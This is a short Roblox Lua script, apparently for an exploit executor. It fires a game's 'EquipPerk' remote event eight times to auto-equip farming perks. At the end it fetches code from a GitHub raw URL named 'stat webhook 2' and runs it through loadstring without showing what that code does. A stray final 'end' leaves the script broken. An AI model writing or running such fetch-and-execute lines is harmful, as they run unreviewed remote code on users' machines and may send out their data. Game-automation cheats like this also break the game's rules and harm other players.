function AutoEquipFarmPerks()

local args = {
    [1] = "LuckyCharm",
    [2] = 2
}

game:GetService("ReplicatedStorage"):WaitForChild("RemoteEvents"):WaitForChild("EquipPerk"):FireServer(unpack(args))

local args = {
    [1] = "ExplosionRadius",
    [2] = 4
}

game:GetService("ReplicatedStorage"):WaitForChild("RemoteEvents"):WaitForChild("EquipPerk"):FireServer(unpack(args))

local args = {
    [1] = "ClusterChance",
    [2] = 3
}

game:GetService("ReplicatedStorage"):WaitForChild("RemoteEvents"):WaitForChild("EquipPerk"):FireServer(unpack(args))

local args = {
    [1] = "EquipmentAmount",
    [2] = 11
}

game:GetService("ReplicatedStorage"):WaitForChild("RemoteEvents"):WaitForChild("EquipPerk"):FireServer(unpack(args))

local args = {
    [1] = "EquipmentDuration",
    [2] = 6
}

game:GetService("ReplicatedStorage"):WaitForChild("RemoteEvents"):WaitForChild("EquipPerk"):FireServer(unpack(args))

local args = {
    [1] = "EquipmentKillRefill",
    [2] = 1
}

game:GetService("ReplicatedStorage"):WaitForChild("RemoteEvents"):WaitForChild("EquipPerk"):FireServer(unpack(args))

local args = {
    [1] = "EquipmentAttackSpeed",
    [2] = 5
}

game:GetService("ReplicatedStorage"):WaitForChild("RemoteEvents"):WaitForChild("EquipPerk"):FireServer(unpack(args))

local args = {
    [1] = "RoundMoney",
    [2] = 12
}

game:GetService("ReplicatedStorage"):WaitForChild("RemoteEvents"):WaitForChild("EquipPerk"):FireServer(unpack(args))

end


wait(10)
loadstring(game:HttpGet(('https://raw.githubusercontent.com/hinoaki2sabu/FS/refs/heads/main/stat%20webhook%202'),true))()
AutoEquipFarmPerks()
end
